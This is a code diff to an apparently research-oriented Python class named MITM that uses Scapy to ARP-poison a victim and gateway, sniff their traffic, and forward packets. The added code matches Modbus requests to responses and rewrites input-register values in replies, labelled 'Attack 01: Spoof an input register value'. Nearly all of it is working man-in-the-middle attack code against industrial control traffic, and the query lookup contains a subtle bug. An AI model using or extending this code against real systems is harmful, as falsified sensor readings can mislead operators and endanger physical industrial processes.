@@ -456,6 +456,10 @@ class MITM:
 		self.victim=(victimIP, getmacbyip(victimIP))
 		self.node2=(gatewayIP, getmacbyip(gatewayIP))
 		self.mymac=get_if_hwaddr(iface)
+		self.querys = {}
+
+		self.val_addr = 6
+		self.val_spoofed = None
 		multiprocessing.Process(target=self.arp_poison).start()
 		try:
 			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
@@ -485,11 +489,27 @@ class MITM:
 			if packet.haslayer(UDP):
 				del(packet[UDP].chksum)
 
-		#Include injection actions
-#TODO: create attack
-#		if self.action == "bridgeAlwaysUp":
-#			if ModbusReadRequest and addr = xx:
-#				packet[ReadCoil].value = xxx		
+		#Assemble Query/Response
+		if packet.haslayer(ModbusADU_Request):
+			index = str(packet[IP].src) + " >> " + str(packet[IP].dst) + " [" + str(packet[ModbusADU_Request].transId) + "]"
+			self.querys[index] = packet
+		elif packet.haslayer(ModbusADU_Response):
+			index = str(packet[IP].dst) + " >> " + str(packet[IP].src) + " [" + str(packet[ModbusADU_Response].transId) + "]"
+			
+			#If we do not have the query, we reject the packet
+			if self.querys[index] is None:
+				return
+
+			query = self.querys[index]
+			del self.querys[index]
+
+		#Attack 01 : Spoof an input register value
+			#If it is a reply of a request with the desired address, we modify the answer
+			if ModbusPDU04_Read_Input_Registers_Response in packet and ModbusPDU04_Read_Input_Registers_Request in query:
+				if query[ModbusPDU04_Read_Input_Registers_Request].startAddr <= self.val_addr and query[ModbusPDU04_Read_Input_Registers_Request].startAddr + query[ModbusPDU04_Read_Input_Registers_Request].quantity > self.val_addr:
+					packet[ModbusPDU04_Read_Input_Registers_Response].registerVal[self.val_addr - query[ModbusPDU04_Read_Input_Registers_Request].startAddr] = self.val_spoofed
+				
+
 
 		sendp(packet, iface=iface)
 
